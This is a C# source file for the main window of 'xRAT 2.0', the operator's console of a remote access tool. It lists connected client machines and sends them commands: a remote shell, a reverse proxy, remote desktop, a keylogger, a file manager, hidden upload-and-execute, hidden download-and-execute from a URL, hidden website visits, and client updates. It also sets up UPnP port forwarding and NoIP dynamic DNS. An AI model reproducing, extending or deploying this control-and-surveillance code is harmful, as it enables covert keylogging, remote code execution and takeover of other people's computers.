﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Commands;
using xServer.Core.Extensions;
using xServer.Core.Helper;
using xServer.Core.Misc;
using xServer.Core.Networking;
using xServer.Settings;
using UserStatus = xServer.Core.Commands.CommandHandler.UserStatus;
using ShutdownAction = xServer.Core.Commands.CommandHandler.ShutdownAction;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public ConnectionHandler ConServer { get; set; }
        public static FrmMain Instance { get; private set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private readonly ListViewColumnSorter _lvwColumnSorter;
        private readonly object _lockClients = new object();
        private bool _titleUpdateRunning;

        private void ReadSettings(bool writeIfNotExist = true)
        {
            if (writeIfNotExist)
                XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.ShowToU = bool.Parse(XMLSettings.ReadValue("ShowToU"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));

            XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
            XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
            XMLSettings.NoIPHost = XMLSettings.ReadValueSafe("NoIPHost");
            XMLSettings.NoIPUsername = XMLSettings.ReadValueSafe("NoIPUsername");
            XMLSettings.NoIPPassword = XMLSettings.ReadValueSafe("NoIPPassword");

            XMLSettings.Password = XMLSettings.ReadValue("Password");
        }

        private void ShowTermsOfService(bool show)
        {
            if (show)
            {
                using (var frm = new FrmTermsOfUse())
                {
                    frm.ShowDialog();
                }
                Thread.Sleep(300);
            }
        }

        public FrmMain()
        {
            Instance = this;

            ReadSettings();

#if !DEBUG
            ShowTermsOfService(XMLSettings.ShowToU);
#endif

            InitializeComponent();

            this.Menu = mainMenu;

            _lvwColumnSorter = new ListViewColumnSorter();
            lstClients.ListViewItemSorter = _lvwColumnSorter;

            lstClients.RemoveDots();
            lstClients.ChangeTheme();
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0) ?
                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ConServer.ConnectedAndAuthenticatedClients, selected) :
                        string.Format("xRAT 2.0 - Connected: {0}", ConServer.ConnectedAndAuthenticatedClients);
                });
            }
            catch
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            ConServer = new ConnectionHandler();

            ConServer.ServerState += ServerState;
            ConServer.ClientConnected += ClientConnected;
            ConServer.ClientDisconnected += ClientDisconnected;
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();

            if (XMLSettings.AutoListen)
            {
                if (XMLSettings.UseUPnP)
                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                ConServer.Listen(XMLSettings.ListenPort);
            }

            if (XMLSettings.IntegrateNoIP)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ConServer.Disconnect();

            if (UPnP.IsPortForwarded)
                UPnP.RemovePort();

            nIcon.Visible = false;
            nIcon.Dispose();
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(ushort port, bool listening)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    botListen.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            new Core.Packets.ServerPackets.GetAuthentication().Execute(client);
        }

        private void ClientDisconnected(Client client)
        {
            if (client.Value != null)
            {
                client.Value.DisposeForms();
                client.Value = null;
            }

            RemoveClientFromListview(client);
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="c">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client c, string text)
        {
            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(c);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="clientItem">The client to add.</param>
        public void AddClientToListview(ListViewItem clientItem)
        {
            try
            {
                if (clientItem == null) return;

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(clientItem);
                        ConServer.ConnectedAndAuthenticatedClients++;
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="c">The client to remove.</param>
        public void RemoveClientFromListview(Client c)
        {
            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
                        {
                            lvi.Remove();
                            ConServer.ConnectedAndAuthenticatedClients--;
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }
        
        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="c">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        public void SetStatusByClient(Client c, string text)
        {
            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(c);
                    if (item != null)
                        item.SubItems[STATUS_ID].Text = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <remarks>
        /// Can be "Active" or "Idle".
        /// </remarks>
        /// <param name="c">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        public void SetUserStatusByClient(Client c, UserStatus userStatus)
        {
            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(c);
                    if (item != null)
                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="c">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client c)
        {
            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && lvi.Tag is Client && c.Equals((Client)lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && lvi.Tag is Client)
                            .Select(lvi => (Client)lvi.Tag));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        public void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstClients.Sort();
        }

        #region "ContextMenu"

        #region "Connection"

        private void ctxtUpdate_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (Core.Misc.Update.UseDownload)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
                                    var fileName = Helper.GetRandomFilename(8, ".exe");
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int ID = new Random().Next(0, int.MaxValue);

                                    CommandHandler.HandleSetStatus(c,
                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new Core.Packets.ServerPackets.DoClientUpdate(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void ctxtDisconnect_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
            }
        }

        private void ctxtReconnect_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
            }
        }

        private void ctxtUninstall_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "System"

        private void ctxtSystemInformation_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSystemInformation frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void ctxtFileManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void ctxtStartupManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmStartupManager frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void ctxtTaskManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void ctxtRemoteShell_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void ctxtReverseProxy_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void ctxtRegistryEditor_Click(object sender, EventArgs e)
        {
            // TODO
        }

        private void ctxtShutdown_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
            }
        }

        private void ctxtRestart_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
            }
        }

        private void ctxtStandby_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
            }
        }

        #endregion

        #region "Surveillance"

        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }

        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
        {
            // TODO
        }

        private void ctxtKeylogger_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void ctxtLocalFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int ID = new Random().Next(0, int.MaxValue);

                                CommandHandler.HandleSetStatus(c,
                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (!srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                    new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
                                        Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                        currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void ctxtWebFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
                                DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DoShowMessageBox(
                                MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
                        }
                    }
                }
            }
        }

        #endregion

        #endregion

        #region "MenuStrip"

        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ConServer))
            {
                frm.ShowDialog();
            }
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (ConServer.BytesReceived == 0 || ConServer.BytesSent == 0)
                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            else
            {
                using (
                    var frm = new FrmStatistics(ConServer.BytesReceived, ConServer.BytesSent,
                        ConServer.ConnectedAndAuthenticatedClients, ConServer.AllTimeConnectedClientsCount))
                {
                    frm.ShowDialog();
                }
            }
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion
    }
}